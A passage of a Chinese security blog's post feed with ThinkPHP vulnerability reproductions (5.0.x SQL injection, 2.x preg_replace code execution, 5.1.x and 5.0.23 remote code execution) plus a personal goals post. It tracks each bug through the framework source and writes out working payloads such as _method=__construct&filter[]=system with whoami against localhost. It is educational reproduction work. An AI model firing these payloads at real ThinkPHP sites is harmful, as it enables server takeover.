buildWhere($where, $options)    {        if (empty($where)) {            $where = [];        }        if ($where instanceof Query) {            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);        }        $whereStr = &#39;&#39;;        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);        foreach ($where as $key =&gt; $val) {            $str = [];            foreach ($val as $field =&gt; $value) {                ...                    // 对字段使用表达式查询                    $field = is_string($field) ? $field : &#39;&#39;;                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);            }            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);        }        return $whereStr;    }</code></pre><p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p><p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p><pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)    {        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;        // 查询规则和条件        if (!is_array($val)) {            $val = [&#39;=&#39;, $val];        }        list($exp, $value) = $val;        // 字段分析        if(....){            ...        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {            // IN 查询            if ($value instanceof \Closure) {                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);            } else {                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);                if (array_key_exists($field, $binds)) {                    $bind  = [];                    $array = [];                    foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }                    $this-&gt;query-&gt;bind($bind);                    $zone = implode(&#39;,&#39;, $array);                } else {                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));                }                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;            }        }         return $whereStr;    }</code></pre><p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p><pre><code class="php">                foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }</code></pre><p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p><p>但是这里只能进行没有子查询语句的sql报错注入</p><p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p><p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/">https://explorersss.github.io/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的2020</title>
      <link href="/2020/01/31/%E6%88%91%E7%9A%842020/"/>
      <url>/2020/01/31/%E6%88%91%E7%9A%842020/</url>
      
        <content type="html"><![CDATA[<h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p><h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p><p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p><p>我想要变得更加优秀,我想活出自己</p><h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>目标是清晰明确的,量化的</li><li>目标难度要适合,不能太简单也不能不可实现</li><li>如果无法确定今年的目标,那就确定这个月的吧</li><li>根据实际情况对目标进行调整</li><li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li></ol><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol><li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li><li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li><li>行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li><li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li><li>小目标永远是为大目标/梦想/想法服务的</li></ol><h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol><li>分解细致，能力可达，留有余地</li><li>奖惩并行</li><li>每个星期总结一次,计划是否合理</li></ol><h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol><li>在自己热爱的事业上获得可观的收入</li><li>身体健康,三观尚在 </li><li>开发一个类似hexo的python程序</li></ol><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p>寒假期间延迟到2.22(不改我完成不了拉)</p><ul><li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li><li><input disabled="" type="checkbox"> 寒假期间复现30个cve(11/30)</li><li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞</li><li><input disabled="" type="checkbox"> 寒假看完码农翻身(1/3)</li></ul><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/01/31/我的2020/">https://explorersss.github.io/2020/01/31/我的2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 2.x任意代码执行漏洞</title>
      <link href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p><p>官网的thinkphp 2.2已经修复了</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p><p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p><p>路由解析处</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p><blockquote><p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p><p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p><pre><code>/foo bar/#^[^0-9]$#+php+%[a-zA-Z0-9_-]%</code></pre></blockquote><p>替换常量,这个就变成了</p><p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p><p>查看preg_replace的介绍发现</p><blockquote><p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p></blockquote><p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p><p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p><p>构造</p><pre><code class="php">$paths=array(    &#39;xxxx&#39;,    &#39;${phpinfo()}&#39;);</code></pre><p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p><p>从而导致命令执行</p><p>于是构造payload</p><p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p><p>用单引号来包围所有引用就可以避免命令执行</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</title>
      <link href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p><p>测试环境 5.1.29</p><p><strong>入口处关闭报错</strong> </p><p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p><p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p><p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p><p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p><p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p><p>我们从<code>Request::param</code>处开始分析</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (!$this-&gt;mergeParam) {            $method = $this-&gt;method(true);            // 自动获取请求变量            switch ($method) {                case &#39;POST&#39;:                    $vars = $this-&gt;post(false);                    break;                case &#39;PUT&#39;:                case &#39;DELETE&#39;:                case &#39;PATCH&#39;:                    $vars = $this-&gt;put(false);                    break;                default:                    $vars = [];            }            // 当前请求参数和URL地址中的参数合并            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...    }</code></pre><p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p><pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;post)) {            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);        }        return $this-&gt;input($this-&gt;post, $name, $default, $filter);    }</code></pre><p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p><p>跟进<code>Request::input</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }       ...    }</code></pre><p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p><p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p><p>跟进去</p><pre><code class="php">private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, &#39;/&#39;)) {                    // 正则过滤                    if (!preg_match($filter, $value)) {                        // 匹配不成功返回默认值                        $value = $default;                        break;                    }                } elseif (!empty($filter)) {                    // filter函数不存在时, 则使用filter_var进行过滤                    // filter为非整形值时, 调用filter_id取得过滤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) {                        $value = $default;                        break;                    }                }            }        }        return $value;    }</code></pre><p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p><p>且<code>$filter</code>=<code>$_POST</code></p><p>因此有</p><pre><code>http://127.0.0.1/public/POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</title>
      <link href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captchapost_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamipost_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p><p> 官方补丁地址：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p><p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p><p>其中<code>$this-&gt;{$this-&gt;method}($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p><p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p><pre><code class="php">protected function __construct($options = [])    {        foreach ($options as $name =&gt; $item) {            if (property_exists($this, $name)) {                $this-&gt;$name = $item;            }        }        if (is_null($this-&gt;filter)) {            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        }        // 保存 php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    }</code></pre><p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//命令执行            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }        ...    }</code></pre><p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p><p>接着查找调用method()的地方,下断点</p><p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p><p>从入口点App.php开始查看可能作为攻击链一部分的地方</p><p>节选App.php关键内容</p><pre><code class="php">public static function run(Request $request = null)    {        $request = is_null($request) ? Request::instance() : $request;        try {            ...            // 获取应用调度信息            $dispatch = self::$dispatch;            // 未设置调度信息则进行 URL 路由检测            if (empty($dispatch)) {                $dispatch = self::routeCheck($request, $config);            }            // 记录当前调度信息            $request-&gt;dispatch($dispatch);            // 记录路由和请求信息            ...            $data = self::exec($dispatch, $config);        } catch (HttpResponseException $exception) {            $data = $exception-&gt;getResponse();        }        ...    }</code></pre><p>跟进routeCheck</p><pre><code class="php">public static function routeCheck($request, array $config)    {        $path   = $request-&gt;path();        $depr   = $config[&#39;pathinfo_depr&#39;];        $result = false;        // 路由检测        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];        if ($check) {            ...            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);            ...        }        ...        return $result;    }</code></pre><p>跟进check,在获取method时调用了method方法</p><pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)    {        //检查解析缓存        ...        $method = strtolower($request-&gt;method());        // 获取当前请求类型的路由规则       ...    }</code></pre><p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p><p>跟进exec瞧一瞧</p><pre><code class="php">protected static function exec($dispatch, $config)    {        switch ($dispatch[&#39;type&#39;]) {            case &#39;redirect&#39;: // 重定向跳转                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)                    -&gt;code($dispatch[&#39;status&#39;]);                break;            case &#39;module&#39;: // 模块/控制器/操作                $data = self::module(                    $dispatch[&#39;module&#39;],                    $config,                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null                );                break;            case &#39;controller&#39;: // 执行控制器操作                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = Loader::action(                    $dispatch[&#39;controller&#39;],                    $vars,                    $config[&#39;url_controller_layer&#39;],                    $config[&#39;controller_suffix&#39;]                );                break;            case &#39;method&#39;: // 回调方法                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);                break;            case &#39;function&#39;: // 闭包                $data = self::invokeFunction($dispatch[&#39;function&#39;]);                break;            case &#39;response&#39;: // Response 实例                $data = $dispatch[&#39;response&#39;];                break;            default:                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);        }        return $data;    }</code></pre><p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>时会调用<code>Request::instance()-&gt;param()</code></p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // 自动获取请求变量            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p><p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p><p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p><p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>的问题了</p><p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p><p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p><blockquote><p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p></blockquote><p>于是最后的payload是</p><pre><code>http://127.0.0.1/index.php?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p><p>我们看到<code>Request::param</code>方法</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // 自动获取请求变量            ...            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    }</code></pre><p>注意这一个<code>$this-&gt;method(true);</code></p><p><code>Request::method</code></p><pre><code class="php">    public function method($method = false)    {        if (true === $method) {            // 获取原始请求类型            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }         ...    }</code></pre><p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p><pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;server)) {            $this-&gt;server = $_SERVER;        }        if (is_array($name)) {            return $this-&gt;server = array_merge($this-&gt;server, $name);        }        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);    }</code></pre><p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (&#39;&#39; != $name) {            // 解析name            if (strpos($name, &#39;/&#39;)) {                list($name, $type) = explode(&#39;/&#39;, $name);            } else {                $type = &#39;s&#39;;            }            // 按.拆分成多维数组进行判断            foreach (explode(&#39;.&#39;, $name) as $val) {                if (isset($data[$val])) {                    $data = $data[$val];                } else {                    // 无输入数据，返回默认值                    return $default;                }            }            if (is_object($data)) {                return $data;            }        }        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        ...        return $data;    }</code></pre><p>于是有</p><pre><code class="php">http://127.0.0.1/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p><p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.0.0<del>5.0.23 RCE 漏洞复现/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.0.0</del>5.0.23 RCE 漏洞复现/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp5rce复现</title>
      <link href="/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/</url>
      
